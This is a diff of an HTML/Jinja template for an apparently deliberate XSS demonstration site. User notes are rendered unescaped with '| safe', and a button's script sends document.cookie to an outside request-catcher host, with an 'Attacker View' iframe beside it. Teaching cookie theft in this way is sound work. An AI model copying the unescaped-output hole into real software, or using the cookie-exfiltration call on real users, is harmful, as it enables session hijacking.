@@ -12,52 +12,48 @@
 <script>
     function haxd() { 
         document.getElementById("hack-me").style.display = "block";
-        var url = "https://haq.requestcatcher.com/?token=" + document.cookie;
+        var url = "https://haq.requestcatcher.com/?=" + document.cookie;
         var win = window.open(url, '_blank');
         win.focus();
     }
 </script>
 <div class="columns is-mobile is-centered">
-	<div class="column is-half">
-			<!-- <div class="block"> -->
-				<h1 class="title is-1">Very Secure Website</h1>
-				<div class="columns">
-					<div class="column is-half">
-						<div class="box">
-							<h1 class="title is-1">Hello {{ username }},</h1>    
-							<h1 class="subtitle">Current Cookie: {{ cookie_value }}</h1><br>
-							<h1 class="title is-6">
-									<ul>
-									{% for note in notes %}
-											<li> {{ note | safe }} </li>
-									{% endfor %}
-									</ul>
-							</h1>
+	<div class="column is-two-thirds">
+		<h1 class="title is-1">Very Secure Website</h1>
+		<div class="columns">
+			<div class="column is-half">
+				<div class="box">
+					<h1 class="title is-1">Hello {{ username }},</h1><br>    
+					<h1 class="title is-4">Current Cookie:</h1>
+					<h1 class="title is-6"> {{ cookie_value }}</h1>
+					<h1 class="title is-4">Your Secret Messages:</h1>
+					<h1 class="title is-6">
+							<ul>
+							{% for note in notes %}
+									<li> {{ note | safe }} </li>
+							{% endfor %}
+							</ul>
+					</h1>
 
-							<button class="button is-fullwidth is-medium is-danger" id="hack-me" onclick="haxd()">I want to get hacked</button>
-							<div class="notification is-warning">
-									<button class="delete"></button>
-									You just clicked a link to <strong>"https://haq.requestcatcher.com/?" + document.cookie</strong>
-							</div>
+					<button class="button is-fullwidth is-medium is-danger" id="hack-me" onclick="haxd()">I want to get hacked</button>
 
-							<form method="POST" name="form" action="{{ url_for('post_note') }}">
-								<div class="field">
-									<label class="label">Update your secret messages!</label>
-									<p class="control">
-											<textarea class="textarea" name="note" placeholder="message"></textarea>
-									</p>
-								</div>
-								<button type="submit" name="submit" class="button is-success is-medium is-centered">Submit</button>
-							</form>
+					<form method="POST" name="form" action="{{ url_for('post_note') }}">
+						<div class="field">
+							<label class="label">Update your secret messages!</label>
+							<p class="control">
+									<textarea class="textarea" name="note" placeholder="message"></textarea>
+							</p>
 						</div>
-					</div>
-					<div class="column is-three-fifths">
-						<div class="box">
-							<h1 class="title is-1">Attacker View</h1>   
-							<iframe src="https://haq.requestcatcher.com" height=500 zoom=0.75 frameborder="0"></iframe>
-					</div>
+						<button type="submit" name="submit" class="button is-success is-medium is-centered">Submit</button>
+					</form>
 				</div>
-			<!-- </div> -->
+			</div>
+		<div class="column is-three-fifths">
+			<div class="box">
+				<h1 class="title is-1">Attacker View</h1>   
+				<iframe src="https://haq.requestcatcher.com" height=500 width=100% zoom=0.75 frameborder="0"></iframe>
+			</div>
+		</div>
 	</div>
 </div>
 
